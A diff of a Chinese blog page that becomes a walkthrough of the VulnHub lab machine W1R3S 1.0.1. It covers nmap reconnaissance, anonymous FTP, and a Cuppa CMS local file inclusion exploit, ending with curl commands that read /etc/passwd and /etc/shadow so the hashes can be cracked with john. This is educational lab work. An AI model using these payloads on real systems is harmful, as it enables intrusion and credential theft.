@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="index,follow">
-  <link rel="canonical" href="http://Marmoz.github.io/"/>
+  
+  <link rel="canonical" href="http://Marmoz.github.io/2023/12/24/w1r3s 1.0.1靶机渗透/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,18 +33,22 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Hsuoamni的个人博客</title>
-  <meta name="keywords" content="">
+  <title>W1R3S 1.0.1靶机渗透 - Hsuoamni的个人博客</title>
+  <meta name="keywords" content="渗透WP,vulnhub靶机练习,null">
   <meta desc name="description" content="卧薪尝胆中~ - ZAH - Hsuoamni的个人博客">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hsuoamni的个人博客">
-<meta property="og:url" content="http://marmoz.github.io/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="W1R3S 1.0.1靶机渗透">
+<meta property="og:url" content="http://marmoz.github.io/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="Hsuoamni的个人博客">
-<meta property="og:description" content="卧薪尝胆中~">
+<meta property="og:description" content="渗透过程信息收集使用工具：nmap 基本信息扫描先确定网段测试时的网段是192.168.148.0&#x2F;24 扫描整个c段确定目标ip注：登录普通账户进行渗透，避免安全问题，每步+sudo1sudo nmap -sn 192.168.148.0&#x2F;24  类似命令： 1sudo arp-scan -l  n的意思是不扫描端口，只显示响应的主机ip信息（sP被弃用，现在用sn），比sL（列表扫描">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2023-12-24T13:16:41.000Z">
+<meta property="article:modified_time" content="2023-12-24T13:31:49.261Z">
 <meta property="article:author" content="ZAH">
+<meta property="article:tag" content="渗透WP">
+<meta property="article:tag" content="vulnhub靶机练习">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2027,7 +2031,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin end-->
     <!-- front-matter body_begin begin -->
     <!-- front-matter body_begin end -->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2296,7 +2300,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="full" class='cover-wrapper  search' style="display: ;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div id="parallax-window"></div>
 
@@ -2348,7 +2352,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   </div>
 </div>
 
-        <div id="scroll-down" style="display: ;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
       </div>
     
   
@@ -2358,35 +2362,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://marmoz.github.io/2023/12/24/W1R3S 1.0.1靶机渗透/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hsuoamni的个人博客">
@@ -2396,234 +2372,366 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="卧薪尝胆中~">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         W1R3S 1.0.1靶机渗透
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">Hsuoamni</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
     
-      
-        渗透过程信息收集使用工具：nmap
-基本信息扫描先确定网段测试时的网段是192.168.148.0&#x2F;24
-扫描整个c段确定目标ip注：登录普通账户进行渗透，避免安全问题，每步+sudo1sudo nmap -sn 192.168.148.0/24
-
-类似命令：
-1sudo arp-scan -l
-
-n的意思是不扫描端口，只显示响应的主机ip信息（sP被弃用，现在用sn），比sL（列...
-      
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url"><span itemprop="name">渗透</span></a>
+      </span>
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-          
-          <a class='avatar' href='/'><img src='https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg'></a>
-          <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-            <meta itemprop="image" content="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg">
-            <meta itemprop="name" content="Hsuoamni">
-            <meta itemprop="url" content="/">
-          </span>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-12-24T21:16:41+08:00">2023-12-24</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url"><span itemprop="name">渗透</span></a>
-            </span>
+
+
           
         
-      </div>
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-12-24T21:16:41+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2023年12月24日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：1.6k 字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fa-solid fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：6 分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+
+<div class="new-meta-item browse">
+  <a class='notlink'>
+    <p>
+      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
       
-        <div>
-          <a class='readmore' href='/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
+      <span id="busuanzi_value_page_pv"><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
+      
+      <span>次浏览</span>
+    </p>
+  </a>
+</div>
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用工具：nmap</p>
+<h3 id="基本信息扫描"><a href="#基本信息扫描" class="headerlink" title="基本信息扫描"></a>基本信息扫描</h3><h4 id="先确定网段"><a href="#先确定网段" class="headerlink" title="先确定网段"></a>先确定网段</h4><p>测试时的网段是192.168.148.0&#x2F;24</p>
+<h4 id="扫描整个c段确定目标ip"><a href="#扫描整个c段确定目标ip" class="headerlink" title="扫描整个c段确定目标ip"></a>扫描整个c段确定目标ip</h4><h5 id="注：登录普通账户进行渗透，避免安全问题，每步-sudo"><a href="#注：登录普通账户进行渗透，避免安全问题，每步-sudo" class="headerlink" title="注：登录普通账户进行渗透，避免安全问题，每步+sudo"></a>注：登录普通账户进行渗透，避免安全问题，每步+sudo</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.148.0/24</span><br></pre></td></tr></table></figure>
+
+<p>类似命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>n的意思是不扫描端口，只显示响应的主机ip信息（sP被弃用，现在用sn），比sL（列表扫描）多了一步轻量级的侦查</p>
+<p>–send-ip(公网探测)</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231222085427597.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231222085427597.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231222085427597" style="zoom:67%;" />
+
+<p>128是本机ip，所以目标ip是192.168.148.129</p>
+<h4 id="扫描目标ip开放端口"><a href="#扫描目标ip开放端口" class="headerlink" title="扫描目标ip开放端口"></a>扫描目标ip开放端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.148.129 -oA nmapscan/ports        </span><br></pre></td></tr></table></figure>
+
+<p> <code>--min-rate 10000</code>:    最小速率10000    （不能太快）</p>
+<p><code>-p</code>: 指定端口范围（默认扫常见1000个端口） -p-：扫描所有端口（1-65535）</p>
+<p><code>-sT</code>:  完整tcp三次握手扫描（比默认值-sS（发syn包，只建立tcp连接第一步，用于快速扫描）较慢但准确，且更容易绕过防火墙）</p>
+<p><code>-oA</code> ：结果全格式输出（o输出，A三种格式全输出）  渗透各步骤都要记录</p>
+<p><strong>原则：准+隐蔽性</strong></p>
+<p>扫描结果：<br> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231222161224489.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231222161224489.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231222161224489" style="zoom: 67%;" /></p>
+<h3 id="详细信息扫描"><a href="#详细信息扫描" class="headerlink" title="详细信息扫描"></a>详细信息扫描</h3><h4 id="提取端口号到-port变量"><a href="#提取端口号到-port变量" class="headerlink" title="提取端口号到$port变量"></a>提取端口号到$port变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap |awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|<span class="built_in">paste</span> -sd <span class="string">&#x27;,&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>grep open</code>提取含open的那几行</p>
+<p><code>awk -F&#39;/&#39; &#39;&#123;print $1&#125;&#39; </code> -F指定分隔符为&#x2F;，{print $1}打印分隔出来的第一列</p>
+<p><code>paste -sd &#39;,&#39;</code> s指定到一行，d指定分隔符为逗号</p>
+<p><code>ports=$(xxx)</code>变量赋值（注意$ports变量只在一个窗口有效）</p>
+<h4 id="编写扫描命令并扫描"><a href="#编写扫描命令并扫描" class="headerlink" title="编写扫描命令并扫描"></a>编写扫描命令并扫描</h4><h5 id="扫描tcp"><a href="#扫描tcp" class="headerlink" title="扫描tcp"></a>扫描tcp</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p 21,22,80,3306 192.168.148.129 -oA nmapscan/detail</span><br></pre></td></tr></table></figure>
+
+<p><code>-sV</code>: 探测各服务的版本</p>
+<p><code>-sC</code>：使用默认脚本进行扫描</p>
+<p><code>-O</code>：探测操作系统的版本</p>
+<p><strong>tab键</strong>读取变量具体值</p>
+<p>这是最重的一次扫描（所以限制了端口号，分阶段扫描可以大大提示扫描的效率）</p>
+<p>扫描结果：</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223183409074.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223183409074.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223183409074" style="zoom:67%;" />
+
+<p><strong>根据扫描结果确定攻击链和渗透的优先级</strong></p>
+<h5 id="扫描udp（扫描速度快）"><a href="#扫描udp（扫描速度快）" class="headerlink" title="扫描udp（扫描速度快）"></a>扫描udp（扫描速度快）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.148.129 -oA nmapscan/udp </span><br></pre></td></tr></table></figure>
+
+<p><code>--top-ports 20</code>：指定最常见的20个端口扫描</p>
+<p>扫描结果：<br> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223183455268.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223183455268.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223183455268" style="zoom:67%;" /></p>
+<h3 id="默认漏洞脚本扫描"><a href="#默认漏洞脚本扫描" class="headerlink" title="默认漏洞脚本扫描"></a>默认漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p 21,22,80,3306 192.168.148.129 -oA nmapscan/vuln </span><br></pre></td></tr></table></figure>
+
+<p> <code>--script=vuln</code>：指定脚本为漏洞扫描</p>
+<p>扫描结果：</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231222160634179.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231222160634179.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231222160634179" style="zoom:67%;" />
+
+<p><strong>优先级</strong></p>
+<p>先看21，3306</p>
+<p>重点看80</p>
+<p>看不出突破点及时切换攻击向量</p>
+<p>一般不选dos攻击</p>
+<p><code>http-enum</code>：枚举</p>
+<h3 id="当找不到攻击连的时候看看有无ipv6的地址"><a href="#当找不到攻击连的时候看看有无ipv6的地址" class="headerlink" title="当找不到攻击连的时候看看有无ipv6的地址"></a>当找不到攻击连的时候看看有无ipv6的地址</h3><h2 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h2><h3 id="先看21端口的ftp服务"><a href="#先看21端口的ftp服务" class="headerlink" title="先看21端口的ftp服务"></a>先看21端口的ftp服务</h3> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223185108145.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223185108145.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223185108145" style="zoom:80%;" />
+
+<p>之前说过可以匿名登录，输入匿名登录名称<strong>anonymous</strong>，密码为空，切换至binary（二进制模式，不切换下载的文件可能是损坏的）</p>
+<p>？可以查看命令提示</p>
+<p>输入prompt命令就不用每次下载文件都交互式确定</p>
+<p><code>mget</code>（多下载）content下的三个txt文件，<code>get</code>单个文件</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223190139338.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223190139338.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223190139338" style="zoom:67%;" />
+
+<h4 id="下载完所有目录及子目录下的文件（binary）后退出ftp"><a href="#下载完所有目录及子目录下的文件（binary）后退出ftp" class="headerlink" title="下载完所有目录及子目录下的文件（binary）后退出ftp"></a>下载完所有目录及子目录下的文件（binary）后退出ftp</h4><p><code>cat *.txt</code> 同时查看导出的文件</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223190357276.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223190357276.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223190357276" style="zoom:80%;" />
+
+<p>inc是公司的意思，new意味着不完善</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223190757094.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223190757094.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223190757094" style="zoom:80%;" />
+
+<h4 id="hash-indentifier识别一下上面的第一个字符串的加密算法为md5"><a href="#hash-indentifier识别一下上面的第一个字符串的加密算法为md5" class="headerlink" title="hash-indentifier识别一下上面的第一个字符串的加密算法为md5"></a>hash-indentifier识别一下上面的第一个字符串的加密算法为md5</h4><h5 id="cmd5里查询md5值如下"><a href="#cmd5里查询md5值如下" class="headerlink" title="cmd5里查询md5值如下"></a>cmd5里查询md5值如下</h5><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223204940010.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223204940010.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223204940010"></p>
+<h4 id="base64解码一下第二个字符串如下"><a href="#base64解码一下第二个字符串如下" class="headerlink" title="base64解码一下第二个字符串如下"></a>base64解码一下第二个字符串如下</h4><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223191502583.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223191502583.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h4 id="分隔符下面的是wires公司员工列表，注意不同身份的权限特点"><a href="#分隔符下面的是wires公司员工列表，注意不同身份的权限特点" class="headerlink" title="分隔符下面的是wires公司员工列表，注意不同身份的权限特点"></a>分隔符下面的是wires公司员工列表，注意不同身份的权限特点</h4><h4 id="底下的字符串用在线逆序和截图镜像功能查看内容"><a href="#底下的字符串用在线逆序和截图镜像功能查看内容" class="headerlink" title="底下的字符串用在线逆序和截图镜像功能查看内容"></a>底下的字符串用在线逆序和截图镜像功能查看内容</h4><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223192814596.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223192814596.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="再看3306端口的mysql服务，发现有主机ip限制，放弃"><a href="#再看3306端口的mysql服务，发现有主机ip限制，放弃" class="headerlink" title="再看3306端口的mysql服务，发现有主机ip限制，放弃"></a>再看3306端口的mysql服务，发现有主机ip限制，放弃</h3><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223193142201.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223193142201.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="最后看80端口的web服务"><a href="#最后看80端口的web服务" class="headerlink" title="最后看80端口的web服务"></a>最后看80端口的web服务</h3><h4 id="浏览器访问ip，发现是apache默认页面"><a href="#浏览器访问ip，发现是apache默认页面" class="headerlink" title="浏览器访问ip，发现是apache默认页面"></a>浏览器访问ip，发现是apache默认页面</h4> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223193409663.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223193409663.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="zoom:50%;" />
+
+<h4 id="gobuster目录爆破，发现存在wordpress和cuppaCMS"><a href="#gobuster目录爆破，发现存在wordpress和cuppaCMS" class="headerlink" title="gobuster目录爆破，发现存在wordpress和cuppaCMS"></a>gobuster目录爆破，发现存在wordpress和cuppaCMS</h4> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223205837665.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223205837665.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223205837665" style="zoom: 67%;" />
+
+<p>由于wordpress访问时自动跳转localhost，所以改一下hosts文件，增加两个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网站IP   localhost</span><br><span class="line">网站ip   任意域名</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223210226472.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223210226472.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223210226472"></p>
+<p>改了之后还是不行，所以优先级排后，先攻击cms网站</p>
+<h4 id="Cuppa-CMS的渗透"><a href="#Cuppa-CMS的渗透" class="headerlink" title="Cuppa CMS的渗透"></a>Cuppa CMS的渗透</h4><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223210857700.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223210857700.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223210857700"><strong>要对点next会对系统造成不可逆的改变或被管理员发现有心理预期</strong></p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223211438053.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223211438053.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223211438053" style="zoom:67%;" />
+
+<h5 id="创建管理员失败"><a href="#创建管理员失败" class="headerlink" title="创建管理员失败"></a>创建管理员失败</h5><h5 id="searchsploit命令查找此CMS的历史漏洞"><a href="#searchsploit命令查找此CMS的历史漏洞" class="headerlink" title="searchsploit命令查找此CMS的历史漏洞"></a>searchsploit命令查找此CMS的历史漏洞</h5><p><img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223211841866.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223211841866.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223211841866"></p>
+<p>找到一条</p>
+<p>使用<code>searchsploit cuppa -m 25971</code>将对应的文档下载到当前文件夹中</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223212538347.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223212538347.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223212538347" style="zoom:80%;" />
+
+<h5 id="查看一下发现是php的文件包含漏洞，使用exploit测试一下可不可行"><a href="#查看一下发现是php的文件包含漏洞，使用exploit测试一下可不可行" class="headerlink" title="查看一下发现是php的文件包含漏洞，使用exploit测试一下可不可行"></a>查看一下发现是php的文件包含漏洞，使用exploit测试一下可不可行</h5><p>简单构造exploit：<a target="_blank" rel="noopener" href="http://192.168.148.129/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.148.129/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223212838658.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223212838658.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223212838658" style="zoom: 50%;" />
+
+<h5 id="有反应但是没有读出来"><a href="#有反应但是没有读出来" class="headerlink" title="有反应但是没有读出来"></a>有反应但是没有读出来</h5><h5 id="找cms源码做代码审计"><a href="#找cms源码做代码审计" class="headerlink" title="找cms源码做代码审计"></a>找cms源码做代码审计</h5><h6 id="发现是post传参"><a href="#发现是post传参" class="headerlink" title="发现是post传参"></a>发现是post传参</h6><img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223214736455.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223214736455.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223214736455" style="zoom:67%;" />
+
+<h5 id="POST传参进行查看发现可行"><a href="#POST传参进行查看发现可行" class="headerlink" title="POST传参进行查看发现可行"></a>POST传参进行查看发现可行</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.148.129/administrator/alerts/alertConfigField.php </span><br></pre></td></tr></table></figure>
+
+<p> <code>--data-urlencode</code> 参数等同于 <code>-d</code>（–data），发送 <code>POST</code> 请求的数据体，区别在于会自动将发送的数据进行 <code>URL</code> 编码</p>
+ <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223215400549.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223215400549.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223215400549" style="zoom: 67%;" />
+
+<p>x说明密码以哈希形式存放在shadow中</p>
+<h5 id="查看shadow文件并保存文件用john进行爆破"><a href="#查看shadow文件并保存文件用john进行爆破" class="headerlink" title="查看shadow文件并保存文件用john进行爆破"></a>查看shadow文件并保存文件用john进行爆破</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.148.129/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>
+
+<p> 只保留有哈希的数据到shadow.hash</p>
